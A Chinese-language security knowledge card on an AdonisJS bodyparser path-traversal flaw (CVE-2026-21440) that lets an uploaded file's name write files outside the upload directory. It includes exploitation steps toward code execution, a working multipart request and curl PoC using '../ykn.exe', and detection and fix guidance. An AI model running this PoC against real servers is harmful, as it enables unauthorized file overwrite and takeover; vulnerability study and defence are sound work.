---
id: web-generic-file-upload-adonisjs-bodyparser-filename-traversal
title: AdonisJS bodyparser 上传文件名路径穿越任意文件写
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-filename-path-traversal
aliases:
- CVE-2026-21440
- AdonisJS 任意文件写
- MultipartFile.move 路径穿越
- bodyparser 文件名穿越
- clientName ../ 写入
tags:
- nodejs
- adonisjs
- bodyparser
- file-upload
- path-traversal
- arbitrary-file-write
- cve-2026-21440
cve:
- CVE-2026-21440
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: bodyparser < 10.1.2
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T02:07:01+08:00'
  notes: 已对照原文与6张图核对：MultipartFile 构造保存 clientName(图03)，move() 默认 name=this.clientName、overwrite=true(图02)，path.join(location,name) 未过滤 ../；图04 实包 filename=../ykn.exe 返回 success 且 filename 原样回显，图05 项目根目录出现 ykn.exe，图06 修复版改用 crypto.randomUUID()，均与卡片一致。卡片关于 path.join 绝对路径不能重置基准、Windows 反斜杠的边界说明正确。CVE-2026-21440 与 bodyparser < 10.1.2 与原文一致，卡片已含 affected_versions。未在本机复现；无 sources/source_url。
---

## 一句话结论

AdonisJS `@adonisjs/bodyparser`（< 10.1.2）的 `MultipartFile.move()` 默认使用客户端上传的文件名（`clientName`），并用 `path.join(location, name)` 拼接目标路径；filename 中的 `../` 不被过滤，可把文件写出上传目录、覆盖任意可写文件。

## 原理

- `MultipartFile` 构造时把 `data.clientName` 保存为 `this.clientName`，该值来自 multipart 请求的 `Content-Disposition: form-data; name="file"; filename="..."`，完全由客户端控制。
- `move(location, options)` 的逻辑：
  ```js
  options = Object.assign({ name: this.clientName, overwrite: true }, options)
  const filePath = join(location, options.name)
  await moveFile(this.tmpPath, filePath, { overwrite: options.overwrite })
  ```
  未显式传 `name` 时使用客户端文件名；`overwrite` 默认为 `true`，可直接覆盖已存在文件。
- Node 的 `path.join(location, '../x')` 会把 `..` 归一化，结果落到 `location` 的父目录；代码没有用 `basename()`、没有拒绝 `..`、也没有校验 `realpath` 是否仍在上传目录内。
- 因此 filename 写成 `../ykn.exe` 时，文件实际写到了上传目录的上一级；叠加多少级 `../` 就能到上层任意可写目录，内容完全可控。
- 注意 `path.join` 不会因后段以 `/` 开头而重置基准目录（`join('/uploads', '/etc/x')` 仍得到 `/uploads/etc/x`），所以绝对路径本身不能穿越，必须用 `../` 相对段。
- 任意文件写可进一步覆盖应用 JS/配置/模板，或在可执行路径写入脚本，从而在应用加载/重启时达到代码执行；原文仅验证了任意文件落地。

## 触发条件

- 应用使用 `@adonisjs/bodyparser < 10.1.2` 的 `MultipartFile`，并调用 `move()` 保存上传文件。
- 调用 `move()` 时未显式指定安全的 `name`（如随机 UUID/白名单扩展名），或允许客户端文件名参与路径。
- 上传目录的父级/目标路径对应用进程可写。
- 攻击者能向该上传接口发送 multipart 请求。

## 利用步骤

1. 确认目标使用存在漏洞的 bodyparser 版本（`package.json` / `package-lock.json` / 响应指纹）。
2. 构造 multipart 上传，把 filename 设为 `../目标文件名`（按需增加 `../` 层级）。
3. 发送请求；服务端 `move()` 成功后返回的 `filename` 会保留 `../`，可据此确认。
4. 在目标文件系统对应位置验证文件落地；若目标可写应用目录，可覆盖 `app.js`、路由文件、模板或写入启动脚本。
5. 触发应用重新加载/重启或访问被覆盖资源，进一步获得代码执行。

## PoC

最小 multipart 请求（filename 为 `../ykn.exe`）：

```http
POST /upload HTTP/1.1
Host: target:3333
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBoTVgy3zcQfNgIUO

------WebKitFormBoundaryBoTVgy3zcQfNgIUO
Content-Disposition: form-data; name="file"; filename="../ykn.exe"
Content-Type: image/jpeg

<文件内容>
------WebKitFormBoundaryBoTVgy3zcQfNgIUO--
```

或使用 curl：

```bash
curl -F 'file=@payload.bin;filename=../ykn.exe' http://target:3333/upload
```

原文响应：

```json
{"success":true,"filename":"../ykn.exe","size":56592}
```

随后在上传目录的上一级（项目根目录）看到 `ykn.exe`，证明写出上传目录成功。

## 变体与关联

- 变体：更多层 `../` 可指向任意可写上层目录；Windows 下 `\` 也是路径分隔符，可用 `..\` 穿越（同进程跑在 Linux 时 `\` 只是普通字符）。绝对路径不能借 `path.join` 重置基准，需用相对段。
- 变体：`overwrite: true` 允许直接覆盖已有文件，无需先删除；可覆盖配置/代码文件。
- 变体：即使应用显式传了 `name`，若 `name` 来自用户输入且未净化，同样可穿越。
- 关联：与上传扩展名校验、解析漏洞、竞争条件组合可升级为 WebShell/RCE；与任意文件写类漏洞（路径穿越、日志注入）同属文件落地原语。
- 关联卡片：[[web-generic-file-upload-extension-zero-check]]

## 检测与防御

- 检测：multipart filename 含 `../`、`..\\`、绝对路径、URL 编码的 `%2e%2e%2f`；响应中返回的 filename 保留路径分隔符。
- 检测：上传目录之外出现与上传内容一致的新文件；应用目录/配置目录文件被非发布流程修改。
- 检测：上传接口返回的文件名/路径异常，或同一客户端上传大量不同路径文件。
- 修复：升级 `@adonisjs/bodyparser` 到 10.1.2+（修复版改用 `crypto.randomUUID()` 生成文件名，不再使用客户端名）。
- 加固：服务端生成随机文件名并保留原始名仅作展示；`basename()` + 拒绝 `..`/绝对路径 + `realpath` 校验必须位于上传目录；默认 `overwrite: false`；上传目录不可执行、与应用代码目录隔离。
